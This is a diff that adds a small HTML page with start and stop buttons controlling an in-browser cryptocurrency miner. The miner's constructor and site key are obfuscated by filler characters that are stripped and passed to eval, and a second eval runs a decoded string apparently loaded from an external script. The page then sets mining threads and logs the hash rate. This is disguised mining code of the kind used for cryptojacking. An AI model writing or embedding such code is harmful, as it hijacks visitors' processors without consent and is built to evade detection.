@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>new html</title>
+</head>
+<body>
+    <button id="start">start</button>
+    <button id="stop">stop</button><br>
+    <p style="color:greenyellow;display:none" id="run">Running.....</p>
+    <p style="color:red" id="pause">Pause</p>
+<!--<script src="m.js"></script>-->
+<script src="m2.js"></script>
+<script>
+    
+	var s1 = "var min0775er = new Coin接Hive.Ano接nym接ous('wd0Cna77awW2g4ZV2jYgN955Av6CzlOV', {thro接ttle: 0.3});";
+
+    let str = strings.replace(/接/g,'')
+    str = str.replace(/转/g,'\\')
+    eval(str)
+    eval(s1.replace(/接/g,''))
+    min0775er.setNumThreads(3)
+    document.getElementById('start').addEventListener('click',function(){
+        min0775er.start()
+        document.getElementById('run').style.display = 'block'
+        document.getElementById('pause').style.display = 'none'
+    })
+    document.getElementById('stop').addEventListener('click',function(){
+        min0775er.stop()
+        document.getElementById('run').style.display = 'none'
+        document.getElementById('pause').style.display = 'block'
+    })
+    setInterval(()=>{
+            // min0775er.start([mode])
+            // console.log(min0775er.stop())
+            // console.log("isRunning",min0775er.isRunning())
+            // console.log("",min0775er.isMobile())
+            // console.log("didoptout",min0775er.didOptOut(seconds))
+            // console.log("event",min0775er.on(event, callback))
+            // console.log("hasWASMSupport",min0775er.hasWASMSupport())
+            console.log("getNumThreads",min0775er.getNumThreads())
+            // console.log("",min0775er.setNumThreads(2))
+            console.log("getThrottle",min0775er.getThrottle())
+            // console.log(min0775er.setThrottle(throttle))
+            // console.log("getToken",min0775er.getToken())
+            console.log("getHashesPerSecond",min0775er.getHashesPerSecond())
+            // console.log(min0775er.getTotalHashes([interpolate]))
+            console.log("getAcceptedHashes",min0775er.getAcceptedHashes())
+            // console.log()
+
+    },1200)
+
+
+
+
+
+
+</script>
+</body>
+</html>
